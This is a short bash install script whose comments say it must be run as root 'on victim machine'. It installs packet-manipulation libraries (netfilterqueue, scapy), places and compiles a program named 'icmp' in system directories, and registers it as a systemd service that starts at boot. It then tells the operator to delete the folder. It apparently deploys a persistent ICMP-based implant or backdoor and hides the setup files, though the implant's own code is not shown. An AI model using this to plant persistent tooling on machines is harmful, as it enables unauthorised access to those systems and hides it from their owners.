#!/bin/bash

# This folder downloaded from git
# cd into same directory as install.sh
# Must run as root
# Only run on victim machine

if [[ $(id -u) != "0" ]]; then
    echo "Must run as root"
    exit 1
fi

apt-get install -y libnfnetlink-dev libnetfilter-queue-dev
apt install python3-pip
pip install netfilterqueue scapy


cp ./icmp /var/lib/icmp
chmod o+x /var/lib/icmp
cp ./icmp.service /lib/systemd/system/icmp.service
mkdir -p /lib/icmp
gcc ./icmp.c -o /lib/icmp/icmp

systemctl start icmp
systemctl enable icmp

echo "Installed..."
echo "You should delete this folder now"